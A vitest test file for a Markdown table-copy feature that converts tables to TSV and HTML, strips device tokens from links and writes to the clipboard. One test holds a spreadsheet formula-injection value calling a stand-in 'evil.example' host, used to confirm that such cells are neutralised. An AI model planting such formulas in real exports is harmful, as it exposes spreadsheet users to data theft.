// @vitest-environment jsdom
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Markdown } from "./Markdown";
import { cellPlainText, quoteTsvField, tableHtml, tableToTsv, withoutToken, writeTableClipboard } from "./tableCopy";

function table(html: string): HTMLTableElement {
  const doc = new DOMParser().parseFromString(`<table>${html}</table>`, "text/html");
  return doc.querySelector("table")!;
}

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("tableToTsv", () => {
  it("keeps the header row and a link's label, not its address", () => {
    const tsv = tableToTsv(
      table(`<tr><th>Name</th><th>Link</th></tr>
        <tr><td><a href="https://example.com/docs">Docs</a></td><td>plain</td></tr>`),
    );
    expect(tsv).toBe("Name\tLink\nDocs\tplain");
    expect(tsv).not.toContain("https://");
  });

  it("copies inline code as its text, pipes included", () => {
    expect(tableToTsv(table(`<tr><td>see <code>a|b</code></td><td>x|y</td></tr>`))).toBe("see a|b\tx|y");
    expect(quoteTsvField("a|b")).toBe("a|b");
  });

  it("keeps a line break inside one quoted cell", () => {
    expect(tableToTsv(table(`<tr><td>line1<br>line2</td><td>next</td></tr>`))).toBe('"line1\nline2"\tnext');
  });

  it("quotes a cell that contains a tab so it does not become another column", () => {
    const cell = document.createElement("td");
    cell.textContent = "left\tright";
    const root = table("<tr><td></td><td>ok</td></tr>");
    root.rows[0].cells[0].replaceWith(cell);
    expect(tableToTsv(root)).toBe('"left\tright"\tok');
  });

  it("quotes a quote and keeps an empty cell empty", () => {
    expect(tableToTsv(table(`<tr><th></th><th>Say</th></tr><tr><td></td><td>say "hi"</td></tr>`))).toBe('\tSay\n\t"say ""hi"""');
  });

  it("does not count a nested table's rows, and skips KaTeX's visual duplicate", () => {
    const root = table(`<tr><td>
      <span class="katex"><span class="katex-mathml"><math><semantics><mi>x</mi><annotation>x^2</annotation></semantics></math></span>
      <span class="katex-html" aria-hidden="true">x</span></span>
      <table><tr><td>nested</td></tr></table>
    </td></tr>`);
    expect(cellPlainText(root.rows[0].cells[0])).toBe("x^2");
    expect(tableToTsv(root)).toBe("x^2");
  });

  it("is undefined when there is no row", () => {
    expect(tableToTsv(table(""))).toBeUndefined();
  });

  it("keeps an image's alt text and a blank line, and does not turn a formula into a live cell", () => {
    expect(tableToTsv(table(`<tr><td>see <img alt="cat" src="cat.png"></td><td>a<br><br>b</td></tr>`))).toBe('see cat\t"a\n\nb"');
    expect(quoteTsvField("=IMPORTDATA(\"https://evil.example/x\")")).toBe("\"'=IMPORTDATA(\"\"https://evil.example/x\"\")\"");
    expect(quoteTsvField("-3")).toBe("-3");
    expect(quoteTsvField("@SUM(A1)")).toBe("'@SUM(A1)");
  });
});

describe("tableHtml", () => {
  it("drops the device token and the duplicate formula tree", () => {
    const root = table(`<tr><td><a href="/api/v1/machines/m/file/download?path=a.log&amp;cwd=&amp;inline=1&amp;token=device-token">log</a>
      <span class="katex"><span class="katex-mathml"><math><annotation>x^2</annotation></math></span><span class="katex-html">x²</span></span></td></tr>`);
    const html = tableHtml(root);
    expect(html).not.toContain("device-token");
    expect(html).not.toContain("token=");
    expect(html).toContain("path=a.log");
    expect(html).toContain("inline=1");
    expect(html).toContain("katex-html");
    expect(html).not.toContain("katex-mathml");
    expect(withoutToken("https://hub.example/file?path=a&token=device-token")).toBe("https://hub.example/file?path=a");
  });
});

describe("Markdown table copy button", () => {
  const md = ["| Name | Code | Empty |", "| --- | --- | --- |", "| [Docs](https://example.com/docs) | `ab` | |", "| p\\|q |  | r |"].join("\n");

  it("renders the button outside the table, hidden until hover or focus", () => {
    const html = renderToStaticMarkup(createElement(Markdown, { text: md }));
    const doc = new DOMParser().parseFromString(html, "text/html");
    const button = doc.querySelector("button");
    expect(button?.getAttribute("aria-label")).toBe("拷贝表格");
    expect(button?.className).toContain("opacity-0");
    expect(button?.className).toContain("group-hover/table:opacity-100");
    expect(button?.className).toContain("focus-visible:opacity-100");
    expect(doc.querySelector("table button")).toBeNull();
  });

  it("places the button from the ResizeObserver's first report, not with a layout read as the table mounts (#2905)", async () => {
    const reports: ResizeObserverCallback[] = [];
    vi.stubGlobal("ResizeObserver", class {
      constructor(cb: ResizeObserverCallback) {
        reports.push(cb);
      }
      observe() {}
      disconnect() {}
    });
    const read = vi.spyOn(HTMLElement.prototype, "offsetTop", "get").mockReturnValue(30);
    const { act } = await import("react");
    const { createRoot } = await import("react-dom/client");
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    const host = document.createElement("div");
    const root = createRoot(host);
    act(() => root.render(createElement(Markdown, { text: md })));
    const button = host.querySelector<HTMLButtonElement>(".md-table > button")!;
    expect(read).not.toHaveBeenCalled();
    expect(button.style.top).toBe("");
    act(() => reports[0]([], {} as ResizeObserver));
    expect(button.style.top).toBe("calc(30px + 0.375rem)");
    act(() => root.unmount());
  });

  it("converts the rendered table: header, link label, inline code, pipes, empty cells", () => {
    const html = renderToStaticMarkup(createElement(Markdown, { text: md }));
    const rendered = new DOMParser().parseFromString(html, "text/html").querySelector("table")!;
    expect(tableToTsv(rendered)).toBe("Name\tCode\tEmpty\nDocs\tab\t\np|q\t\tr");
    expect(rendered.querySelector("a")?.getAttribute("href")).toBe("https://example.com/docs");
    expect(rendered.querySelector("code")?.textContent).toBe("ab");
  });
});

describe("writeTableClipboard", () => {
  function install(write: (items: ClipboardItem[]) => Promise<void>) {
    class Item {
      constructor(readonly parts: Record<string, Blob>) {}
    }
    vi.stubGlobal("ClipboardItem", Item);
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { write } });
  }

  async function textOf(blob: Blob): Promise<string> {
    const reader = new FileReader();
    return new Promise((resolve, reject) => {
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsText(blob);
    });
  }

  it("writes tab-separated text and the table html", async () => {
    let parts: Record<string, Blob> | undefined;
    install(async (items) => {
      parts = (items[0] as unknown as { parts: Record<string, Blob> }).parts;
    });
    const html = "<table><tr><td>a</td></tr></table>";
    expect(await writeTableClipboard("a", html)).toBe(true);
    expect(parts).toBeTruthy();
    expect(await textOf(parts!["text/plain"])).toBe("a");
    expect(await textOf(parts!["text/html"])).toBe(html);
  });

  it("falls back to the copy command when the async write is refused", async () => {
    install(async () => {
      throw new Error("denied");
    });
    let plain = "";
    let rich = "";
    const previous = document.execCommand;
    document.execCommand = ((cmd: string) => {
      if (cmd !== "copy") return false;
      try {
        const store = new Map<string, string>();
        const data = {
          setData: (type: string, value: string) => store.set(type, value),
          getData: (type: string) => store.get(type) ?? "",
        };
        const ev = new Event("copy", { bubbles: true, cancelable: true });
        Object.defineProperty(ev, "clipboardData", { value: data });
        document.dispatchEvent(ev);
        plain = data.getData("text/plain");
        rich = data.getData("text/html");
      } catch (e) {
        plain = e instanceof Error ? e.message : "threw";
      }
      return true;
    }) as typeof document.execCommand;
    try {
      expect(await writeTableClipboard("a\tb", "<table></table>")).toBe(true);
      expect(plain).toBe("a\tb");
      expect(rich).toBe("<table></table>");
    } finally {
      document.execCommand = previous;
    }
  });

  it("keeps the tsv with writeText when the two-format write is refused", async () => {
    const writeText = vi.fn(async () => {});
    const write = vi.fn(async () => {
      throw new Error("denied");
    });
    vi.stubGlobal("ClipboardItem", class {
      constructor(readonly parts: Record<string, Blob>) {}
    });
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { write, writeText } });
    const exec = vi.fn(() => true);
    const previous = document.execCommand;
    document.execCommand = exec as typeof document.execCommand;
    try {
      expect(await writeTableClipboard("a\tb", "<table></table>")).toBe(true);
      expect(writeText).toHaveBeenCalledWith("a\tb");
      expect(exec).not.toHaveBeenCalled();
    } finally {
      document.execCommand = previous;
    }
  });

  it("puts focus back after the plain-http fallback", async () => {
    const btn = document.createElement("button");
    document.body.appendChild(btn);
    btn.focus();
    vi.stubGlobal("ClipboardItem", undefined);
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined });
    const previous = document.execCommand;
    document.execCommand = (() => true) as typeof document.execCommand;
    try {
      expect(await writeTableClipboard("a", "<table></table>")).toBe(true);
      expect(document.activeElement).toBe(btn);
    } finally {
      document.execCommand = previous;
      btn.remove();
    }
  });
});
